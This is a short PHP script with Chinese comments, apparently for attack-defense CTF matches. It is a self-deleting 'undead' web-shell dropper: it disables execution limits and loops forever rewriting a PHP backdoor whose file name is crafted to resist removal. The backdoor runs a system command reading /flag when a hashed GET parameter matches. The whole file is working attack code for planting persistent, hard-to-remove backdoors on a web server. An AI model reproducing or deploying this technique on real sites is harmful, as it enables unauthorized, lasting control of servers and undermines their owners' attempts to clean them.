<?php
ignore_user_abort(true); //设置与客户机之间断开不会终止脚本的执行
set_time_limit(0); //设置脚本最大执行时间为0
# 排除可能存在的两个限制器

unlink(__FILE__);
$file = "--0a".md5(rand(1,3))."[a].php";    //--0a与[a].php 两种都是绕过方式，防止对手删除不死马
$code = '<?php 
if(md5($_GET["cmd"])=="76a2173be6393254e72ffa4d6df1030a"){system("cat /flag");}
 ?>';

while (1) {
	file_put_contents($file, $code);
	usleep(10);
}

?>